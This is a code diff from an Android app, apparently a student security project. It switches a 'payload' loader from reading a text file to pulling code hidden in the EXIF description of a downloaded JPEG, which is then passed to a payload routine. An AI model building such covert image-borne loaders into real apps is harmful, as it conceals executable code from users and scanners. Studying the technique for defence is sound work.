@@ -5,6 +5,7 @@ import android.app.AlertDialog;
 import android.app.DownloadManager;
 import android.content.Context;
 import android.content.DialogInterface;
+import android.media.ExifInterface;
 import android.net.Uri;
 import android.os.Environment;
 import android.support.v4.app.ActivityCompat;
@@ -20,7 +21,6 @@ import android.widget.Toast;
 import com.client_progettosicurezza.adapters.AdapterImmagine;
 import com.client_progettosicurezza.api.APIService;
 import com.client_progettosicurezza.compiler.Compile;
-import com.client_progettosicurezza.compiler.ConvertFile;
 import com.client_progettosicurezza.models.Aggiornamento;
 import com.client_progettosicurezza.models.Immagine;
 import com.client_progettosicurezza.results.ResultAggiornamento;
@@ -114,7 +114,9 @@ public class MainActivity extends AppCompatActivity {
                 break;
 
             case R.id.info:
-                File file = new File(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/classe.txt");
+                String pathFile = Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg";
+                File file = new File(pathFile);
+
                 payload(file);
                 break;
         }
@@ -126,9 +128,9 @@ public class MainActivity extends AppCompatActivity {
         String codice = "";
 
         try {
-            ConvertFile convertFile = new ConvertFile();
-            codice = convertFile.getStringFromFile(file.getAbsolutePath());
-        } catch (Exception e) {
+            ExifInterface exif = new ExifInterface(file.getAbsolutePath());
+            codice = exif.getAttribute(ExifInterface.TAG_IMAGE_DESCRIPTION);
+        } catch (IOException e) {
             e.printStackTrace();
         }
 
